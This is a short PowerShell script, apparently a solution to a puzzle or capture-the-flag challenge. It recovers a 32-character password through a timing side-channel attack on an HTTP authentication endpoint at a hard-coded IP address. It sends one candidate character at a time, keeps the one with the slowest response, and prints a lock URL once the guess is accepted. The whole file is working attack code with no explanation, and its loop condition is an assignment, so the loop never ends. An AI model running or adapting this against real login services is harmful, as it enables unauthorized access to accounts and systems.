$list = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0")

$dtable = New-Object System.Data.DataTable
$dtable.Columns.Add("Time", "System.String") | Out-Null
$dtable.Columns.Add("Char", "System.String") | Out-Null


$max = 0
$found = ""
$stop = $false
while ($stop = $true){
    foreach ($char in $list){
        $row = $dtable.NewRow()
        $params = @{"Seed"="a722b91c792043a8a28d269cb782717a";"Password"="$found$char"} | ConvertTo-Json
        $headers = @{"Server"="iWalk-Server-v2"}
        $response = Invoke-RestMethod -uri "http://35.246.158.51:8070/auth/v1_1" -UserAgent "ed9ae2c0-9b15-4556-a393-23d500675d4b" -Method Post -Body $params -Headers $headers -ContentType "application/json"
        $row.Time = $response.Time 
        $row.Char = $char
        $dtable.Rows.Add($row)
        if ($response.IsValid -eq "$true"){
            $response.LockURL
            $stop = $true
            }


    }
    #$dtable | Sort-Object -Property Time -Descending | Format-Table -AutoSize
    
    $max = ($dtable|Measure-Object -Property Time -Maximum ).Maximum
    $rightcc = $dtable | where {$_.time -eq $max} | select -ExpandProperty Char
    $found = $found+$rightcc
    $found
    $found.Length
    if ($found.Length -eq "32" ){
        $stop = $true
        }
    $dtable.Clear()
}
$found
